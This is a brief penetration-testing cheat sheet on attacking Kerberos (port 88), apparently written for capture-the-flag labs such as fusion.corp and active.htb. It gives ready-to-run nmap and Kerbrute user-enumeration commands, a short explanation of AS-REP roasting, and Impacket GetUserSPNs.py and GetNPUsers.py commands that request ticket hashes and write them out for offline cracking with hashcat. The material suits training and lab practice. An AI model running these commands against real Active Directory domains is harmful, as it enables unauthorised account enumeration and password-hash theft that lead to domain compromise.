# Port 88 - Kerberus

## Enumerate users
### Nmap
```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='fusion.corp',userdb=users.txt 10.10.249.23
```

### Kerbrute
```bash
1-Create a list of usernames (don’t forget to add Administrator and Guest)
2-Enumerate the domain name
3-Run the enumeration script

Example:
DNS_Domain_Name: SECRET.org
./kerbrute userenum /home/kali/users.txt -d secret.org --dc 192.168.100.55
#git clone https://github.com/ropnop/kerbrute.git
```

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.**

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

## **Retrieving Kerberos Tickets**

[Impacket](https://github.com/SecureAuthCorp/impacket) has a tool called **GetNPUsers.py** (located in `impacket/examples/GetNPUsers.py`) that will allow us to query **ASReproastable** accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a **valid set of usernames** which we enumerated previously via Kerbrute.

## Attempt to get a list of user service principal names:

```bash
GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs
```

## Get the Hash - TGT (ASPROASTABLE)

```
GetNPUsers.py 'fusion.corp/' -usersfile lparker.txt -no-pass -dc-ip 10.10.112.255 -format hashcat -outputfile hashes
GetNPUsers.py fusion.corp/lparker -no-pass -request -outputfile lparker.krb
```